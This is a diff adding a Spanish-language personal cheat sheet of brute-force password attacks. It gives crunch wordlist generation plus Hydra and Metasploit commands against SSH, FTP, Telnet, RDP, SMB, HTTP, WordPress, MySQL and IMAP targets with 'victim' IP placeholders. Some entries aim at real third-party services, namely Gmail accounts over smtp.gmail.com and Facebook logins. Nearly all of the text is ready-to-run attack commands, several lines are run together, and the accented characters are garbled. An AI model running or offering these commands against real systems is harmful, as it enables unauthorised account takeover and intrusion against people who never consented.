@@ -1,0 +1,125 @@
+------------------------------------------------------
+////////////////////////////////////////////////////////////////////////////////////////////
+////// FUERZA BRUTA  /////////////////
+//////////////////////////////////////////////////////////////////////////////////////
+sudo su    //para quedar como super usuario de kalilinux
+setxkbmap es sundeadkeys   //poner el teclado en espa�ol
+date "MMDDhhmmCCYY"
+date "081807472021"
+sudo apt-get update
+
+HYDRA, NCRACK, MEDUSA // fuerza bruta para ssh
+https://securityhacklabs.net/articulo/hacking-ssh-obteniendo-contrasenas-de-cualquier-servidor-mediante-fuerza-bruta
+
+////////CREACION DE DICCIONARIOS
+crunch <mincaracteres> <maxcaracter> <caracteresQueVanDentroDeLaContrase�a> -o /home/Desktop/contrase�a.txt
+crunch 8 8 1234567890abcdefghijklmnopqrstuvwxyz -o /home/kali/Desktop/contrase�a.txt
+crunch 8 8 asdasdasd > /home/Desktop/contrase�a.txt
+
+/////////FUERZA BRUTA DE SSH
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set blank_passwords true
+set pass_file /home/kali/Desktop/pass.txt
+set user_file /home/kali/Desktop/users.txt
+set rhosts <ipvictima>
+run
+https://www.youtube.com/watch?v=ivr-FiwlqBo
+
+msfconsole   //no me sirvio, no encuentra el usuario
+use auxiliary/scanner/ssh/ssh_enumusers //con este exploit encontramos un usuario
+set user_file /home/kali/Desktop/user.txt
+set verbose true
+set rhosts <ipvictima>
+run   
+hydra -V -l <NombreDelUsuario> -p /home/Desktop/pass.txt -t 16 <IpVicOPaginaWeb> ssh  //al final mostrara cuales es su usuario y contrase�a
+ssh <IpVicOPaginaWeb> -l root
+ssh <usuarioVictima>@<ipvictima>
+
+
+HYDRA
+hydra <ipvictima> ssh -s <puertossh> -L <listaUsuarios> -P <listaContrase�as> -f -vV
+ssh <usuarioVictima>@<ipvictima>
+https://hacking-etico.com/2014/02/05/ataque-de-fuerza-bruta-ssh-con-hydra/
+
+///////FUERZA BRUTA FTP
+hydra -s 21 -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contrase�as.txt -e s -t 10 -w 5 <ipvictima> ftp  //este es cuando no se sabe el nombre del usuario
+
+hydra -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contrase�as.txt <ipvictima> ftp  //este es cuando no se sabe el nombre del usuario
+hydra -l <usuario> -P /home/kali/Desktop/contrase�as.txt <ipvictima> ftp  //este es para cuando ya se sabe el usuario
+ftp <ipvictima>  //para acceder al ftp de forma remota con las claves desifradas
+
+msfconsole
+use auxiliary/scanner/tftp/tftpbrute
+set RHOSTS 192.168.1.116
+set THREADS 10
+run
+
+instalar el ftp en ubuntu https://blog.baehost.com/tutorialcomo-instalar-un-servidor-ftp-en-ubuntu-server/
+sebastian - sebastian
+
+///////FUERZA BRUTA TELNET
+hydra -s 23 -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contrase�as.txt -e ns -t 60 -w 15 -f -m <ipvictima> telnet  //este es cuando no se sabe el nombre del usuario
+telnet localhost 
+telnet <ipVictima> <PortTelnet>
+
+msfconsole
+use auxiliary/scanner/telnet/telnet_login
+set BLANK_PASSWORDS false
+set PASS_FILE passwords.txt
+set RHOSTS 192.168.1.0/24
+set THREADS 254
+set USER_FILE users.txt
+set VERBOSE false
+run
+
+///////FUERZA BRUTA RDP
+hydra -t 4 -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contrase�as.txt rdp://<ipvictima>   //este es cuando no se sabe el nombre del usuario
+rdesktop <ipVictima>
+
+///////FUERZA BRUTA SMB LOGIN SAMBA
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.150-165
+set PASS_FILE /root/passwords.txt
+set USER_FILE /root/users.txt
+set THREADS 16
+set VERBOSE false
+run
+
+///////FUERZA BRUTA HTTP-GET -port 80
+hydra <ipVictima> http-get -v -V -L /home/kali/Desktop/user.txt -P /home/kali/Desktop/contrase�as.txt -e ns -t 5 -w 30 -m / -f   //este es cuando no se sabe el nombre del usuario
+
+///////FUERZA BRUTA HTTP-POST-FROM
+https://www.youtube.com/watch?v=3hjHdkZsCCo
+ 
+///////FUERZA BRUTA EN WORDPRESS
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+set URI /wordpress/wp-login.php
+set PASS_FILE /tmp/passes.txt
+set USER_FILE /tmp/users.txt
+set RHOSTS 192.168.1.201
+run
+
+///////FUERZA BRUTA EN MYSQL
+msfconsole
+use auxiliary/scanner/mysql/mysql_login
+set PASS_FILE /tmp/passes.txt
+set RHOSTS 192.168.1.200set USER_FILE /tmp/users.txtrun
+
+///////FUERZA BRUTA GMAIL
+hydra -s 465 -S -v -V -l <correoVictima> -P '/home/Desktop/user.txt' -t 1 -w 32 smtp.gmail.com smtp
+https://www.youtube.com/watch?v=9WmJNceMP1g
+
+hydra -S -l <correoVictima> -P /home/Desktop/user.txt -e ns -V -s 465 smtp.gmail.com smtp 
+
+///////FUERZA BRUTA FACEBOOK
+hydra -s 443 -l <correoVictima> -P /home/Desktop/contrase�a.txt -f www.facebook.com https-get
+
+///////FUERZA BRUTA A IMAP
+msfconsole
+use auxiliary/dos/windows/imap/fuzz_imap
+set RHOST <ipVictima>
+set IMAPUSER test
+set IMAPPASS testrun
